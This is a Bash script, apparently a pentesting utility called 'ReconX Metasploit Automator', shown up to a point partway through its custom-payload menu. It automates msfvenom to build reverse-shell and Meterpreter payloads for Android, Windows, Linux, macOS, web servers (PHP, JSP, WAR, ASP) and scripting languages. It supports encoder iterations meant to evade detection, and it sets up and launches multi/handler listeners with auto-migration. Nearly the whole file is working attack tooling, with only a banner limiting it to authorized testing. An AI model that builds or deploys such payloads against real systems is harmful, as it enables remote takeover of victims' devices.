#!/usr/bin/env bash
################################################################################
# ReconX Metasploit Automator v7.0 - Professional Edition
# Author: ReconX Team (Enhanced for Asprintq)
# Description: Advanced Metasploit automation framework with full error handling
# Use only in authorized penetration testing environments
################################################################################

set -euo pipefail
IFS=$'\n\t'

# ============================================================================
# CONFIGURATION
# ============================================================================
readonly SCRIPT_VERSION="7.0"
readonly SCRIPT_NAME="ReconX MSF Automator"
readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Directory structure
readonly BASE_DIR="${HOME}/reconx_msf"
readonly OUTPUT_DIR="${BASE_DIR}/output"
readonly LOG_DIR="${BASE_DIR}/logs"
readonly PAYLOAD_DIR="${BASE_DIR}/payloads"
readonly RC_DIR="${BASE_DIR}/resource_files"
readonly SESSION_DIR="${BASE_DIR}/sessions"
readonly BACKUP_DIR="${BASE_DIR}/backups"
readonly TEMP_DIR="${BASE_DIR}/temp"

# Binary paths
MSFCONSOLE_BIN=""
MSFVENOM_BIN=""

# Default configuration
DEFAULT_LHOST=""
DEFAULT_LPORT=4444

# Color codes
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly PURPLE='\033[0;35m'
readonly CYAN='\033[0;36m'
readonly WHITE='\033[1;37m'
readonly BOLD='\033[1m'
readonly NC='\033[0m' # No Color

# ============================================================================
# LOGGING FUNCTIONS
# ============================================================================
log() {
  local level="$1"
  shift
  local msg="$*"
  local timestamp
  timestamp="$(date +'%Y-%m-%d %H:%M:%S')"
  
  case "$level" in
    SUCCESS)
      echo -e "${GREEN}[✓]${NC} $msg" >&2
      echo "[$timestamp] [SUCCESS] $msg" >> "$LOG_DIR/reconx.log"
      ;;
    ERROR)
      echo -e "${RED}[✗]${NC} $msg" >&2
      echo "[$timestamp] [ERROR] $msg" >> "$LOG_DIR/reconx.log"
      ;;
    WARNING)
      echo -e "${YELLOW}[!]${NC} $msg" >&2
      echo "[$timestamp] [WARNING] $msg" >> "$LOG_DIR/reconx.log"
      ;;
    INFO)
      echo -e "${BLUE}[i]${NC} $msg" >&2
      echo "[$timestamp] [INFO] $msg" >> "$LOG_DIR/reconx.log"
      ;;
    DEBUG)
      echo -e "${CYAN}[DEBUG]${NC} $msg" >&2
      echo "[$timestamp] [DEBUG] $msg" >> "$LOG_DIR/reconx.log"
      ;;
    *)
      echo -e "${CYAN}[*]${NC} $msg" >&2
      echo "[$timestamp] $msg" >> "$LOG_DIR/reconx.log"
      ;;
  esac
}

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================
create_directory_structure() {
  local dirs=(
    "$BASE_DIR"
    "$OUTPUT_DIR"
    "$LOG_DIR"
    "$PAYLOAD_DIR"
    "$RC_DIR"
    "$SESSION_DIR"
    "$BACKUP_DIR"
    "$TEMP_DIR"
  )
  
  for dir in "${dirs[@]}"; do
    if [[ ! -d "$dir" ]]; then
      mkdir -p "$dir" 2>/dev/null || {
        log ERROR "Failed to create directory: $dir"
        return 1
      }
    fi
  done
  
  log INFO "Directory structure initialized at: $BASE_DIR"
  return 0
}

safe_filename() {
  local input="$1"
  # Remove dangerous characters and spaces
  input="${input//\//_}"
  input="${input// /_}"
  input="${input//\\/_}"
  # Keep only alphanumeric, dots, underscores, and hyphens
  printf '%s' "$input" | tr -cd '[:alnum:]._-' | cut -c1-200
}

detect_lhost() {
  local ip=""
  
  # Try multiple methods to get IP
  # Method 1: ip route
  ip=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' | head -n1)
  
  # Method 2: hostname -I
  if [[ -z "$ip" ]]; then
    ip=$(hostname -I 2>/dev/null | awk '{print $1}')
  fi
  
  # Method 3: ifconfig
  if [[ -z "$ip" ]]; then
    ip=$(ifconfig 2>/dev/null | grep -oP 'inet \K[\d.]+' | grep -v '127.0.0.1' | head -n1)
  fi
  
  # Fallback
  ip="${ip:-127.0.0.1}"
  
  printf '%s' "$ip"
}

check_port_available() {
  local port="$1"
  if netstat -tuln 2>/dev/null | grep -q ":${port} "; then
    return 1
  fi
  return 0
}

validate_ip() {
  local ip="$1"
  if [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
    return 0
  fi
  return 1
}

validate_port() {
  local port="$1"
  if [[ $port =~ ^[0-9]+$ ]] && [ "$port" -ge 1 ] && [ "$port" -le 65535 ]; then
    return 0
  fi
  return 1
}

# ============================================================================
# DEPENDENCY CHECKING
# ============================================================================
check_dependencies() {
  log INFO "Checking dependencies..."
  
  local missing_critical=0
  local missing_optional=0
  
  # Critical dependencies
  if ! command -v msfconsole &>/dev/null; then
    log ERROR "msfconsole not found"
    missing_critical=1
  else
    MSFCONSOLE_BIN="$(command -v msfconsole)"
    log SUCCESS "msfconsole found: $MSFCONSOLE_BIN"
  fi
  
  if ! command -v msfvenom &>/dev/null; then
    log ERROR "msfvenom not found"
    missing_critical=1
  else
    MSFVENOM_BIN="$(command -v msfvenom)"
    log SUCCESS "msfvenom found: $MSFVENOM_BIN"
  fi
  
  # Optional dependencies
  local optional_tools=("tmux" "xterm" "gnome-terminal" "netstat" "ip" "tree")
  for tool in "${optional_tools[@]}"; do
    if command -v "$tool" &>/dev/null; then
      log SUCCESS "$tool found: $(command -v "$tool")"
    else
      log WARNING "$tool not found (optional)" >/dev/null 2>&1
    fi
  done
  
  if [[ $missing_critical -gt 0 ]]; then
    echo ""
    log ERROR "Critical dependencies missing!"
    echo -e "${YELLOW}Installation guide:${NC}"
    echo "  Kali Linux:    sudo apt update && sudo apt install -y metasploit-framework"
    echo "  Ubuntu/Debian: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall"
    echo "  Arch Linux:    sudo pacman -S metasploit"
    echo ""
    read -rp "Continue anyway? [y/N]: " cont
    [[ ! "$cont" =~ ^[Yy]$ ]] && exit 1
  fi
  
  echo ""
  log SUCCESS "All critical dependencies are installed"
  
  return 0
}

# ============================================================================
# PAYLOAD GENERATION CORE
# ============================================================================
generate_payload() {
  local payload_type="$1"
  local lhost="$2"
  local lport="$3"
  local encoder="${4:-none}"
  local iterations="${5:-1}"
  local arch="${6:-}"
  local platform="${7:-}"
  
  # Validate inputs
  if ! validate_ip "$lhost"; then
    log ERROR "Invalid LHOST: $lhost"
    return 1
  fi
  
  if ! validate_port "$lport"; then
    log ERROR "Invalid LPORT: $lport"
    return 1
  fi
  
  local timestamp
  timestamp="$(date +%Y%m%d_%H%M%S)"
  
  local msf_payload=""
  local output_file=""
  local format=""
  local need_format_flag=true
  
  # Payload configuration
  case "$payload_type" in
    # Android
    android|apk)
      msf_payload="android/meterpreter/reverse_tcp"
      output_file="$PAYLOAD_DIR/android_${timestamp}.apk"
      format="raw"
      need_format_flag=false
      ;;
    
    # Windows
    windows|exe)
      msf_payload="windows/meterpreter/reverse_tcp"
      output_file="$PAYLOAD_DIR/windows_staged_${timestamp}.exe"
      format="exe"
      ;;
    windows-x64|exe64)
      msf_payload="windows/x64/meterpreter/reverse_tcp"
      output_file="$PAYLOAD_DIR/windows_x64_staged_${timestamp}.exe"
      format="exe"
      ;;
    windows-stageless|exe-stageless)
      msf_payload="windows/meterpreter_reverse_tcp"
      output_file="$PAYLOAD_DIR/windows_stageless_${timestamp}.exe"
      format="exe"
      ;;
    windows-x64-stageless|exe64-stageless)
      msf_payload="windows/x64/meterpreter_reverse_tcp"
      output_file="$PAYLOAD_DIR/windows_x64_stageless_${timestamp}.exe"
      format="exe"
      ;;
    
    # Linux
    linux|elf)
      msf_payload="linux/x86/meterpreter/reverse_tcp"
      output_file="$PAYLOAD_DIR/linux_x86_${timestamp}.elf"
      format="elf"
      ;;
    linux-x64|elf64)
      msf_payload="linux/x64/meterpreter/reverse_tcp"
      output_file="$PAYLOAD_DIR/linux_x64_${timestamp}.elf"
      format="elf"
      ;;
    linux-stageless|elf-stageless)
      msf_payload="linux/x86/meterpreter_reverse_tcp"
      output_file="$PAYLOAD_DIR/linux_x86_stageless_${timestamp}.elf"
      format="elf"
      ;;
    linux-x64-stageless|elf64-stageless)
      msf_payload="linux/x64/meterpreter_reverse_tcp"
      output_file="$PAYLOAD_DIR/linux_x64_stageless_${timestamp}.elf"
      format="elf"
      ;;
    
    # macOS
    macos|macho)
      msf_payload="osx/x64/meterpreter/reverse_tcp"
      output_file="$PAYLOAD_DIR/macos_x64_${timestamp}.macho"
      format="macho"
      ;;
    macos-stageless|macho-stageless)
      msf_payload="osx/x64/meterpreter_reverse_tcp"
      output_file="$PAYLOAD_DIR/macos_x64_stageless_${timestamp}.macho"
      format="macho"
      ;;
    
    # Web payloads
    php)
      msf_payload="php/meterpreter_reverse_tcp"
      output_file="$PAYLOAD_DIR/php_meterpreter_${timestamp}.php"
      format="raw"
      # Auto-correct encoder for PHP
      if [[ "$encoder" != "none" && "$encoder" != "php/base64" ]]; then
        log WARNING "PHP payloads only support php/base64 encoder. Auto-correcting..."
        encoder="php/base64"
      fi
      ;;
    php-cmd)
      msf_payload="php/reverse_php"
      output_file="$PAYLOAD_DIR/php_cmd_${timestamp}.php"
      format="raw"
      if [[ "$encoder" != "none" && "$encoder" != "php/base64" ]]; then
        encoder="php/base64"
      fi
      ;;
    jsp)
      msf_payload="java/jsp_shell_reverse_tcp"
      output_file="$PAYLOAD_DIR/jsp_shell_${timestamp}.jsp"
      format="raw"
      ;;
    war)
      msf_payload="java/jsp_shell_reverse_tcp"
      output_file="$PAYLOAD_DIR/java_war_${timestamp}.war"
      format="war"
      ;;
    asp)
      msf_payload="windows/meterpreter/reverse_tcp"
      output_file="$PAYLOAD_DIR/asp_shell_${timestamp}.asp"
      format="asp"
      ;;
    aspx)
      msf_payload="windows/meterpreter/reverse_tcp"
      output_file="$PAYLOAD_DIR/aspx_shell_${timestamp}.aspx"
      format="aspx"
      ;;
    
    # Scripting languages
    python|py)
      msf_payload="python/meterpreter_reverse_tcp"
      output_file="$PAYLOAD_DIR/python_${timestamp}.py"
      format="raw"
      ;;
    python-stageless|py-stageless)
      msf_payload="python/meterpreter/reverse_tcp"
      output_file="$PAYLOAD_DIR/python_stageless_${timestamp}.py"
      format="raw"
      ;;
    powershell|ps1)
      msf_payload="windows/x64/meterpreter/reverse_tcp"
      output_file="$PAYLOAD_DIR/powershell_${timestamp}.ps1"
      format="psh"
      ;;
    bash|sh)
      msf_payload="cmd/unix/reverse_bash"
      output_file="$PAYLOAD_DIR/bash_${timestamp}.sh"
      format="raw"
      encoder="none"  # Bash doesn't support encoding
      ;;
    perl|pl)
      msf_payload="cmd/unix/reverse_perl"
      output_file="$PAYLOAD_DIR/perl_${timestamp}.pl"
      format="raw"
      encoder="none"  # Perl doesn't support encoding
      ;;
    ruby|rb)
      msf_payload="ruby/shell_reverse_tcp"
      output_file="$PAYLOAD_DIR/ruby_${timestamp}.rb"
      format="raw"
      ;;
    
    *)
      log ERROR "Unknown payload type: $payload_type"
      return 1
      ;;
  esac
  
  log INFO "Generating $payload_type payload"
  log INFO "MSF Payload: $msf_payload"
  log INFO "Output file: $output_file"
  log INFO "LHOST: $lhost | LPORT: $lport"
  
  # Build msfvenom command
  local cmd_array=("$MSFVENOM_BIN" "-p" "$msf_payload" "LHOST=$lhost" "LPORT=$lport")
  
  # Add architecture if specified
  if [[ -n "$arch" ]]; then
    cmd_array+=("-a" "$arch")
  fi
  
  # Add platform if specified
  if [[ -n "$platform" ]]; then
    cmd_array+=("--platform" "$platform")
  fi
  
  # Add encoder if specified
  if [[ "$encoder" != "none" && -n "$encoder" ]]; then
    cmd_array+=("-e" "$encoder" "-i" "$iterations")
    log INFO "Using encoder: $encoder (iterations: $iterations)"
  fi
  
  # Add format flag
  if [[ "$need_format_flag" == true ]]; then
    cmd_array+=("-f" "$format")
  fi
  
  # Add output file
  cmd_array+=("-o" "$output_file")
  
  # Execute command
  log DEBUG "Command: ${cmd_array[*]}"
  
  local temp_output
  temp_output="$TEMP_DIR/msfvenom_output_$$.log"
  
  if "${cmd_array[@]}" >"$temp_output" 2>&1; then
    if [[ -f "$output_file" && -s "$output_file" ]]; then
      local file_size
      file_size=$(stat -f%z "$output_file" 2>/dev/null || stat -c%s "$output_file" 2>/dev/null || echo "unknown")
      log SUCCESS "Payload generated successfully!"
      log INFO "File: $output_file"
      log INFO "Size: $(numfmt --to=iec-i --suffix=B "$file_size" 2>/dev/null || echo "${file_size} bytes")"
      
      # Set executable permission for scripts
      case "$payload_type" in
        bash|sh|perl|pl|python|py|ruby|rb)
          chmod +x "$output_file" 2>/dev/null
          ;;
      esac
      
      # Return payload path
      printf '%s' "$msf_payload"
      return 0
    else
      log ERROR "Payload file not created or is empty"
      cat "$temp_output" >> "$LOG_DIR/payload_errors.log"
      cat "$temp_output"
      return 1
    fi
  else
    log ERROR "Failed to generate payload"
    cat "$temp_output" >> "$LOG_DIR/payload_errors.log"
    echo ""
    log ERROR "Error details:"
    cat "$temp_output"
    echo ""
    log INFO "Full error log saved to: $LOG_DIR/payload_errors.log"
    return 1
  fi
}

# ============================================================================
# HANDLER MANAGEMENT
# ============================================================================
start_handler() {
  local lhost="$1"
  local lport="$2"
  local payload="$3"
  local auto_migrate="${4:-false}"
  local auto_run_script="${5:-}"
  
  if ! validate_ip "$lhost"; then
    log ERROR "Invalid LHOST: $lhost"
    return 1
  fi
  
  if ! validate_port "$lport"; then
    log ERROR "Invalid LPORT: $lport"
    return 1
  fi
  
  local safe_payload
  safe_payload=$(safe_filename "$payload")
  local timestamp
  timestamp=$(date +%Y%m%d_%H%M%S)
  local rc_file="$RC_DIR/handler_${safe_payload}_${lhost}_${lport}_${timestamp}.rc"
  
  log INFO "Creating handler resource file..."
  
  cat > "$rc_file" <<EOF
# ReconX Handler Configuration
# Generated: $(date)
# LHOST: $lhost
# LPORT: $lport
# PAYLOAD: $payload

use exploit/multi/handler
set PAYLOAD $payload
set LHOST $lhost
set LPORT $lport
set ExitOnSession false
set SessionCommunicationTimeout 0
set EnableStageEncoding true
EOF

  # Add auto-migrate if enabled
  if [[ "$auto_migrate" == "true" ]]; then
    cat >> "$rc_file" <<EOF
set AutoRunScript post/windows/manage/migrate
EOF
    log INFO "Auto-migrate enabled"
  fi
  
  # Add custom AutoRunScript if provided
  if [[ -n "$auto_run_script" ]]; then
    echo "set AutoRunScript $auto_run_script" >> "$rc_file"
    log INFO "Custom AutoRunScript: $auto_run_script"
  fi
  
  cat >> "$rc_file" <<EOF

# Start handler
exploit -j -z

EOF

  log SUCCESS "Handler RC file created: $rc_file"
  
  # Launch handler
  log INFO "Starting handler on $lhost:$lport"
  
  if command -v tmux &>/dev/null; then
    local session_name="msf-handler-$lport"
    if tmux has-session -t "$session_name" 2>/dev/null; then
      log WARNING "Session $session_name already exists. Killing old session..."
      tmux kill-session -t "$session_name"
    fi
    
    tmux new-session -d -s "$session_name" "$MSFCONSOLE_BIN -q -r '$rc_file'"
    log SUCCESS "Handler started in tmux session: $session_name"
    log INFO "Attach with: tmux attach -t $session_name"
    log INFO "List sessions: tmux ls"
    
  elif command -v screen &>/dev/null; then
    local session_name="msf-handler-$lport"
    screen -dmS "$session_name" "$MSFCONSOLE_BIN" -q -r "$rc_file"
    log SUCCESS "Handler started in screen session: $session_name"
    log INFO "Attach with: screen -r $session_name"
    
  elif command -v xterm &>/dev/null; then
    xterm -T "MSF Handler:$lhost:$lport" -e "$MSFCONSOLE_BIN -q -r '$rc_file'" &
    log SUCCESS "Handler started in xterm"
    
  elif command -v gnome-terminal &>/dev/null; then
    gnome-terminal -- bash -c "$MSFCONSOLE_BIN -q -r '$rc_file'; exec bash"
    log SUCCESS "Handler started in gnome-terminal"
    
  else
    log WARNING "No terminal multiplexer found. Starting in foreground..."
    "$MSFCONSOLE_BIN" -q -r "$rc_file"
  fi
  
  return 0
}

start_multiple_handlers() {
  local lhost="$1"
  local start_port="$2"
  local count="$3"
  local payload="${4:-windows/meterpreter/reverse_tcp}"
  
  log INFO "Starting $count handlers from port $start_port"
  
  for ((i=0; i<count; i++)); do
    local port=$((start_port + i))
    
    if ! check_port_available "$port"; then
      log WARNING "Port $port already in use, skipping..."
      continue
    fi
    
    log INFO "Starting handler $((i+1))/$count on port $port"
    start_handler "$lhost" "$port" "$payload" "false" ""
    
    sleep 1
  done
  
  log SUCCESS "Started $count handlers"
}

# ============================================================================
# MENU SYSTEM - BANNER
# ============================================================================
show_banner() {
  clear
  echo -e "${PURPLE}${BOLD}"
  cat <<'BANNER'
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗██╗  ██╗           ║
║   ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║╚██╗██╔╝           ║
║   ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║ ╚███╔╝            ║
║   ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║ ██╔██╗            ║
║   ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║██╔╝ ██╗           ║
║   ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝           ║
║                                                                   ║
║              Metasploit Automation Framework v7.0                ║
║                   Professional Edition                           ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
BANNER
  echo -e "${NC}"
  echo -e "${YELLOW}${BOLD}  ⚠️  AUTHORIZED PENETRATION TESTING ONLY ⚠️${NC}"
  echo -e "${CYAN}  Detected LHOST:${NC} ${GREEN}${BOLD}$DEFAULT_LHOST${NC}"
  echo -e "${CYAN}  Working Directory:${NC} ${GREEN}$BASE_DIR${NC}"
  echo ""
}

# ============================================================================
# MENU SYSTEM - PAYLOAD SELECTION
# ============================================================================
show_payload_categories() {
  echo -e "${CYAN}${BOLD}Available Payload Categories:${NC}"
  echo ""
  echo -e "${GREEN}  1)${NC} Mobile Platforms    ${BLUE}(Android)${NC}"
  echo -e "${GREEN}  2)${NC} Windows Payloads    ${BLUE}(EXE, DLL, ASP, ASPX, PowerShell)${NC}"
  echo -e "${GREEN}  3)${NC} Linux Payloads      ${BLUE}(ELF 32/64-bit)${NC}"
  echo -e "${GREEN}  4)${NC} macOS Payloads      ${BLUE}(Mach-O)${NC}"
  echo -e "${GREEN}  5)${NC} Web Payloads        ${BLUE}(PHP, JSP, WAR)${NC}"
  echo -e "${GREEN}  6)${NC} Script Payloads     ${BLUE}(Python, Bash, Perl, Ruby)${NC}"
  echo -e "${GREEN}  7)${NC} Custom Payload      ${BLUE}(Manual configuration)${NC}"
  echo ""
  echo -e "${RED}  0)${NC} Back to Main Menu"
  echo ""
}

menu_payload_generation() {
  while true; do
    show_banner
    show_payload_categories
    
    read -rp "$(echo -e ${CYAN}Select category [0-7]: ${NC})" category
    
    case "$category" in
      1) submenu_mobile_payloads ;;
      2) submenu_windows_payloads ;;
      3) submenu_linux_payloads ;;
      4) submenu_macos_payloads ;;
      5) submenu_web_payloads ;;
      6) submenu_script_payloads ;;
      7) submenu_custom_payload ;;
      0) return ;;
      *) log ERROR "Invalid option"; sleep 1 ;;
    esac
  done
}

# ============================================================================
# SUB-MENUS - PAYLOAD TYPES
# ============================================================================
submenu_mobile_payloads() {
  show_banner
  echo -e "${CYAN}${BOLD}Mobile Payloads${NC}"
  echo ""
  echo -e "${GREEN}  1)${NC} Android APK (Meterpreter)"
  echo -e "${RED}  0)${NC} Back"
  echo ""
  
  read -rp "$(echo -e ${CYAN}Select [0-1]: ${NC})" choice
  
  case "$choice" in
    1)
      local lh lp
      read -rp "LHOST (default $DEFAULT_LHOST): " lh; lh="${lh:-$DEFAULT_LHOST}"
      read -rp "LPORT (default $DEFAULT_LPORT): " lp; lp="${lp:-$DEFAULT_LPORT}"
      
      if generate_payload "android" "$lh" "$lp" "none" "1" "" ""; then
        read -rp "Start handler? [Y/n]: " start_h
        if [[ ! "$start_h" =~ ^[Nn]$ ]]; then
          start_handler "$lh" "$lp" "android/meterpreter/reverse_tcp" "false" ""
        fi
      fi
      read -rp "Press Enter to continue..."
      ;;
    0) return ;;
    *) log ERROR "Invalid option"; sleep 1 ;;
  esac
}

submenu_windows_payloads() {
  show_banner
  echo -e "${CYAN}${BOLD}Windows Payloads${NC}"
  echo ""
  echo -e "${GREEN}  1)${NC} Windows EXE (x86 Staged)"
  echo -e "${GREEN}  2)${NC} Windows EXE (x64 Staged)"
  echo -e "${GREEN}  3)${NC} Windows EXE (x86 Stageless)"
  echo -e "${GREEN}  4)${NC} Windows EXE (x64 Stageless)"
  echo -e "${GREEN}  5)${NC} ASP Web Shell"
  echo -e "${GREEN}  6)${NC} ASPX Web Shell"
  echo -e "${GREEN}  7)${NC} PowerShell Script"
  echo -e "${RED}  0)${NC} Back"
  echo ""
  
  read -rp "$(echo -e ${CYAN}Select [0-7]: ${NC})" choice
  
  local payload_type msf_payload
  case "$choice" in
    1) payload_type="windows"; msf_payload="windows/meterpreter/reverse_tcp" ;;
    2) payload_type="windows-x64"; msf_payload="windows/x64/meterpreter/reverse_tcp" ;;
    3) payload_type="windows-stageless"; msf_payload="windows/meterpreter_reverse_tcp" ;;
    4) payload_type="windows-x64-stageless"; msf_payload="windows/x64/meterpreter_reverse_tcp" ;;
    5) payload_type="asp"; msf_payload="windows/meterpreter/reverse_tcp" ;;
    6) payload_type="aspx"; msf_payload="windows/meterpreter/reverse_tcp" ;;
    7) payload_type="powershell"; msf_payload="windows/x64/meterpreter/reverse_tcp" ;;
    0) return ;;
    *) log ERROR "Invalid option"; sleep 1; return ;;
  esac
  
  local lh lp enc iter
  read -rp "LHOST (default $DEFAULT_LHOST): " lh; lh="${lh:-$DEFAULT_LHOST}"
  read -rp "LPORT (default $DEFAULT_LPORT): " lp; lp="${lp:-$DEFAULT_LPORT}"
  
  read -rp "Use encoder? [y/N]: " use_enc
  if [[ "$use_enc" =~ ^[Yy]$ ]]; then
    echo -e "${CYAN}Recommended encoder: x86/shikata_ga_nai${NC}"
    read -rp "Encoder (default x86/shikata_ga_nai): " enc; enc="${enc:-x86/shikata_ga_nai}"
    read -rp "Iterations (default 5): " iter; iter="${iter:-5}"
  else
    enc="none"
    iter="1"
  fi
  
  if generate_payload "$payload_type" "$lh" "$lp" "$enc" "$iter" "" ""; then
    read -rp "Start handler? [Y/n]: " start_h
    if [[ ! "$start_h" =~ ^[Nn]$ ]]; then
      start_handler "$lh" "$lp" "$msf_payload" "false" ""
    fi
  fi
  read -rp "Press Enter to continue..."
}

submenu_linux_payloads() {
  show_banner
  echo -e "${CYAN}${BOLD}Linux Payloads${NC}"
  echo ""
  echo -e "${GREEN}  1)${NC} Linux ELF (x86 Staged)"
  echo -e "${GREEN}  2)${NC} Linux ELF (x64 Staged)"
  echo -e "${GREEN}  3)${NC} Linux ELF (x86 Stageless)"
  echo -e "${GREEN}  4)${NC} Linux ELF (x64 Stageless)"
  echo -e "${RED}  0)${NC} Back"
  echo ""
  
  read -rp "$(echo -e ${CYAN}Select [0-4]: ${NC})" choice
  
  local payload_type msf_payload
  case "$choice" in
    1) payload_type="linux"; msf_payload="linux/x86/meterpreter/reverse_tcp" ;;
    2) payload_type="linux-x64"; msf_payload="linux/x64/meterpreter/reverse_tcp" ;;
    3) payload_type="linux-stageless"; msf_payload="linux/x86/meterpreter_reverse_tcp" ;;
    4) payload_type="linux-x64-stageless"; msf_payload="linux/x64/meterpreter_reverse_tcp" ;;
    0) return ;;
    *) log ERROR "Invalid option"; sleep 1; return ;;
  esac
  
  local lh lp enc iter
  read -rp "LHOST (default $DEFAULT_LHOST): " lh; lh="${lh:-$DEFAULT_LHOST}"
  read -rp "LPORT (default $DEFAULT_LPORT): " lp; lp="${lp:-$DEFAULT_LPORT}"
  
  read -rp "Use encoder? [y/N]: " use_enc
  if [[ "$use_enc" =~ ^[Yy]$ ]]; then
    echo -e "${CYAN}Recommended encoder: x86/shikata_ga_nai or x64/xor_dynamic${NC}"
    read -rp "Encoder: " enc
    read -rp "Iterations (default 5): " iter; iter="${iter:-5}"
  else
    enc="none"
    iter="1"
  fi
  
  if generate_payload "$payload_type" "$lh" "$lp" "$enc" "$iter" "" ""; then
    read -rp "Start handler? [Y/n]: " start_h
    if [[ ! "$start_h" =~ ^[Nn]$ ]]; then
      start_handler "$lh" "$lp" "$msf_payload" "false" ""
    fi
  fi
  read -rp "Press Enter to continue..."
}

submenu_macos_payloads() {
  show_banner
  echo -e "${CYAN}${BOLD}macOS Payloads${NC}"
  echo ""
  echo -e "${GREEN}  1)${NC} macOS Mach-O (Staged)"
  echo -e "${GREEN}  2)${NC} macOS Mach-O (Stageless)"
  echo -e "${RED}  0)${NC} Back"
  echo ""
  
  read -rp "$(echo -e ${CYAN}Select [0-2]: ${NC})" choice
  
  local payload_type msf_payload
  case "$choice" in
    1) payload_type="macos"; msf_payload="osx/x64/meterpreter/reverse_tcp" ;;
    2) payload_type="macos-stageless"; msf_payload="osx/x64/meterpreter_reverse_tcp" ;;
    0) return ;;
    *) log ERROR "Invalid option"; sleep 1; return ;;
  esac
  
  local lh lp
  read -rp "LHOST (default $DEFAULT_LHOST): " lh; lh="${lh:-$DEFAULT_LHOST}"
  read -rp "LPORT (default $DEFAULT_LPORT): " lp; lp="${lp:-$DEFAULT_LPORT}"
  
  if generate_payload "$payload_type" "$lh" "$lp" "none" "1" "" ""; then
    read -rp "Start handler? [Y/n]: " start_h
    if [[ ! "$start_h" =~ ^[Nn]$ ]]; then
      start_handler "$lh" "$lp" "$msf_payload" "false" ""
    fi
  fi
  read -rp "Press Enter to continue..."
}

submenu_web_payloads() {
  show_banner
  echo -e "${CYAN}${BOLD}Web Payloads${NC}"
  echo ""
  echo -e "${GREEN}  1)${NC} PHP Meterpreter"
  echo -e "${GREEN}  2)${NC} PHP Command Shell"
  echo -e "${GREEN}  3)${NC} JSP Shell"
  echo -e "${GREEN}  4)${NC} Java WAR"
  echo -e "${GREEN}  5)${NC} ASP Shell"
  echo -e "${GREEN}  6)${NC} ASPX Shell"
  echo -e "${RED}  0)${NC} Back"
  echo ""
  
  read -rp "$(echo -e ${CYAN}Select [0-6]: ${NC})" choice
  
  local payload_type msf_payload
  case "$choice" in
    1) payload_type="php"; msf_payload="php/meterpreter_reverse_tcp" ;;
    2) payload_type="php-cmd"; msf_payload="php/reverse_php" ;;
    3) payload_type="jsp"; msf_payload="java/jsp_shell_reverse_tcp" ;;
    4) payload_type="war"; msf_payload="java/jsp_shell_reverse_tcp" ;;
    5) payload_type="asp"; msf_payload="windows/meterpreter/reverse_tcp" ;;
    6) payload_type="aspx"; msf_payload="windows/meterpreter/reverse_tcp" ;;
    0) return ;;
    *) log ERROR "Invalid option"; sleep 1; return ;;
  esac
  
  local lh lp enc
  read -rp "LHOST (default $DEFAULT_LHOST): " lh; lh="${lh:-$DEFAULT_LHOST}"
  read -rp "LPORT (default $DEFAULT_LPORT): " lp; lp="${lp:-$DEFAULT_LPORT}"
  
  if [[ "$payload_type" == "php" || "$payload_type" == "php-cmd" ]]; then
    read -rp "Use PHP base64 encoding? [y/N]: " use_enc
    enc=$([[ "$use_enc" =~ ^[Yy]$ ]] && echo "php/base64" || echo "none")
  else
    enc="none"
  fi
  
  if generate_payload "$payload_type" "$lh" "$lp" "$enc" "1" "" ""; then
    read -rp "Start handler? [Y/n]: " start_h
    if [[ ! "$start_h" =~ ^[Nn]$ ]]; then
      start_handler "$lh" "$lp" "$msf_payload" "false" ""
    fi
  fi
  read -rp "Press Enter to continue..."
}

submenu_script_payloads() {
  show_banner
  echo -e "${CYAN}${BOLD}Script Payloads${NC}"
  echo ""
  echo -e "${GREEN}  1)${NC} Python (Staged)"
  echo -e "${GREEN}  2)${NC} Python (Stageless)"
  echo -e "${GREEN}  3)${NC} Bash Reverse Shell"
  echo -e "${GREEN}  4)${NC} Perl Reverse Shell"
  echo -e "${GREEN}  5)${NC} Ruby Reverse Shell"
  echo -e "${RED}  0)${NC} Back"
  echo ""
  
  read -rp "$(echo -e ${CYAN}Select [0-5]: ${NC})" choice
  
  local payload_type msf_payload
  case "$choice" in
    1) payload_type="python"; msf_payload="python/meterpreter_reverse_tcp" ;;
    2) payload_type="python-stageless"; msf_payload="python/meterpreter/reverse_tcp" ;;
    3) payload_type="bash"; msf_payload="cmd/unix/reverse_bash" ;;
    4) payload_type="perl"; msf_payload="cmd/unix/reverse_perl" ;;
    5) payload_type="ruby"; msf_payload="ruby/shell_reverse_tcp" ;;
    0) return ;;
    *) log ERROR "Invalid option"; sleep 1; return ;;
  esac
  
  local lh lp
  read -rp "LHOST (default $DEFAULT_LHOST): " lh; lh="${lh:-$DEFAULT_LHOST}"
  read -rp "LPORT (default $DEFAULT_LPORT): " lp; lp="${lp:-$DEFAULT_LPORT}"
  
  if generate_payload "$payload_type" "$lh" "$lp" "none" "1" "" ""; then
    if [[ "$payload_type" != "bash" && "$payload_type" != "perl" ]]; then
      read -rp "Start handler? [Y/n]: " start_h
      if [[ ! "$start_h" =~ ^[Nn]$ ]]; then
        start_handler "$lh" "$lp" "$msf_payload" "false" ""
      fi
    fi
  fi
  read -rp "Press Enter to continue..."
}

submenu_custom_payload() {
  show_banner
  echo -e "${CYAN}${BOLD}Custom Payload Configuration${NC}"
  echo ""
  
  read -rp "Enter MSF payload (e.g., windows/meterpreter/reverse_tcp): " custom_payload
  read -rp "LHOST: " lh
  read -rp "LPORT: " lp
  read -rp "Output format (exe/elf/raw/etc): " fmt
  read -rp "Output filename: " outfile
  
  if [[ -z "$custom_payload" || -z "$lh" || -z "$lp" || -z "$fmt" || -z "$outfile" ]]; then
    log ERROR "All fields are required"
    read -rp "Press Enter to continue..."
    return
  fi
